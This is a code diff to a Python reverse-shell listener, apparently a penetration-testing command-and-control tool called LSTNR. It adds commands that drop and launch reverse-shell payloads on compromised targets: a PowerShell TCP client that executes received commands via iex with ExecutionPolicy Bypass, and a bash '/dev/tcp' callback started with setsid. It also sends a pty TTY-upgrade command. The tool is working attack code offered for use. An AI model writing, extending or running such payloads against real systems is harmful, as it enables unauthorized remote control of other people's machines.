@@ -64,23 +64,25 @@ def print_error(error_message):
 
 def print_menu():
     """Prints a formal list of available commands."""
-    message = f"""{ORANGE}\n╔═════════════════════════════════════════════════════════════╗
-║                        MENU COMMANDS                        ║
-╠═════════════════════════════════════════════════════════════╣
-║ help | ?      - Show this help menu                         ║
-║ ls            - List active sessions                        ║
-║ cs <id>       - Connect to a specific session by ID         ║
-║ die           - Terminate all sessions                      ║
-║ exit          - Terminate all sessions and shuts down LSTNR ║
-╠═════════════════════════════════════════════════════════════╣
-║                      SESSION COMMANDS                       ║
-╠═════════════════════════════════════════════════════════════╣
-║ whoami        - Updates the session table                   ║
-║ hostname      - Updates the session table                   ║
-║ bs | CTRL+c   - Background the current session              ║
-║ stable        - TTY shell upgrade                           ║
-║ die           - Terminates the current session              ║
-╚═════════════════════════════════════════════════════════════╝{RESET}\n"""
+    message = f"""{ORANGE}\n╔═══════════════════════════════════════════════════════════════╗
+║                         MENU COMMANDS                         ║
+╠═══════════════════════════════════════════════════════════════╣
+║ help | ?        - Show this help menu                         ║
+║ ls              - List active sessions                        ║
+║ cs <id>         - Connect to a specific session by ID         ║
+║ die             - Terminate all sessions                      ║
+║ exit            - Terminate all sessions and shuts down LSTNR ║
+╠═══════════════════════════════════════════════════════════════╣
+║                       SESSION COMMANDS                        ║
+╠═══════════════════════════════════════════════════════════════╣
+║ whoami          - Updates the session table                   ║
+║ hostname        - Updates the session table                   ║
+║ bs | CTRL+c     - Background the current session              ║
+║ stable          - TTY shell upgrade for Linux systems         ║
+║ payload windows - Builds a rev.ps1 on TGT and a new session   ║
+║ payload linux   - Builds a rev.sh on TGT and a new session    ║
+║ die             - Terminates the current session              ║
+╚═══════════════════════════════════════════════════════════════╝{RESET}\n"""
     print(message)
     log_to_file("Displayed menu.")
 
@@ -144,7 +146,7 @@ def handle_client(client_socket, addr, session_number):
                     del sessions[session_number]
                 return
 
-            # Check for "hostname" command
+            # Check for "whoami" command
             if command.lower() == "whoami":
                 try:
                     # The session we're currently working with
@@ -172,16 +174,16 @@ def handle_client(client_socket, addr, session_number):
                     session["hostname"] = hostname_output
                     print(f"{ORANGE}Captured hostname for session {session_number}: {hostname_output}{RESET}")
                     log_to_file(f"Captured hostname for session {session_number}: {hostname_output}")
-
                 except Exception as e:
                     print_error(f"Error during gather for session {session_number}: {e}")
-            # Check for "hostname" command
+
+            # Check for "stable" command
             if command.lower() == "stable":
                 try:
                     session = sessions[session_number]
                     client_socket = session["socket"]
 
-                    # Send the TTY upgrade command
+                    # Send the TTY upgrade command directly without sending 'stable'
                     tty_command = 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n'
                     client_socket.sendall(tty_command.encode())
 
@@ -189,6 +191,66 @@ def handle_client(client_socket, addr, session_number):
                     log_to_file(f"[*] Sent TTY upgrade command to session {session_number}.")
                 except Exception as e:
                     print_error(f"Error during shell upgrade for session {session_number}: {e}")
+
+            
+            # builds a new revshell for the current session
+            # basically, if your current session elevates or is a new user
+            # use this to create a new session just for the new user
+            if command.lower() == "payload windows":
+                try:
+                    session = sessions[session_number]
+                    client_socket = session["socket"]
+                    # Automatically detect listener IP and port from the socket
+                    listener_ip = client_socket.getsockname()[0]
+                    listener_port = client_socket.getsockname()[1]
+                    # PowerShell reverse shell payload
+                    ps_payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}', {listener_port});
+            $stream = $client.GetStream();
+            [byte[]]$bytes = 0..65535|%{{0}};
+            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+                $sendback = (iex $data 2>&1 | Out-String );
+                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+                $stream.Write($sendbyte,0,$sendbyte.Length);
+                $stream.Flush();
+            }}
+            $client.Close();"""
+
+                    # Escape PowerShell quotes
+                    ps_encoded = ps_payload.replace("'", "''")
+                    # Drop it on the client as rev.ps1
+                    drop_command = f"echo '{ps_encoded}' > rev.ps1"
+                    client_socket.sendall(drop_command.encode() + b"\n")
+                    print(f"{YELLOW}[*] Payload created using {listener_ip}:{listener_port} and saved as rev.ps1{RESET}")
+                    log_to_file(f"[*] Sent PowerShell payload using {listener_ip}:{listener_port} to session {session_number}")
+                    #exec_command = "powershell -ExecutionPolicy Bypass -File rev.ps1"
+                    exec_command = "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File rev.ps1'"
+                    client_socket.sendall(exec_command.encode() + b"\n")
+
+                except Exception as e:
+                    print_error(f"Error creating payload: {e}")
+
+            # builds a new revshell for the current session
+            # basically, if your current session elevates or is a new user
+            # use this to create a new session just for the new user
+            if command.lower() == "payload linux":
+                try:
+                    session = sessions[session_number]
+                    client_socket = session["socket"]
+                    # Automatically get listener IP and port
+                    listener_ip = client_socket.getsockname()[0]
+                    listener_port = client_socket.getsockname()[1]
+                    # Bash reverse shell payload (no escaping needed in echo)
+                    bash_payload = f"/bin/sh -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
+                    # Command to write payload to rev.sh
+                    drop_command = f'echo "{bash_payload}" > rev.sh && chmod +x rev.sh'
+                    client_socket.sendall(drop_command.encode() + b"\n")
+                    print(f"{YELLOW}[*] Linux payload created using {listener_ip}:{listener_port} and saved as rev.sh{RESET}")
+                    log_to_file(f"[*] Sent bash reverse shell payload to session {session_number} using {listener_ip}:{listener_port}")
+                    client_socket.sendall(b"setsid bash rev.sh >/dev/null 2>&1 < /dev/null &\n")
+                except Exception as e:
+                    print_error(f"Error creating Linux payload: {e}")
 
             # Send other commands to the client
             else:
@@ -295,8 +357,8 @@ def session_manager():
                 except:
                     print_error("Invalid command. Usage: cs <session_id>")
             elif command.lower() == "die":
-                print(f"{RED}[!] Terminating all sessions.{RESET}")
-                log_to_file("[!] Terminating all sessions.")
+                print(f"{ORANGE}[!] Killing all sessions.{RESET}")
+                log_to_file("[!] Killing all sessions.")
                 with lock:
                     for sid in list(sessions.keys()):
                         sessions[sid]["socket"].send(b"exit\n")
@@ -305,8 +367,8 @@ def session_manager():
                 print(f"{ORANGE}[+] All sessions terminated.{RESET}")
                 log_to_file("[+] All sessions terminated.")
             elif command.lower() == "exit":
-                print(f"{RED}[!] Killing all sessions.{RESET}")
-                print(f"{ORANGE}[+] Shutting down LSTNR.{RESET}")
+                print(f"{ORANGE}[!] Killing all sessions.{RESET}")
+                print(f"{PINK}[+] Shutting down LSTNR.{RESET}")
                 log_to_file("[!] Killing all sessions. Shutting down LSTNR.")
                 break
             else:
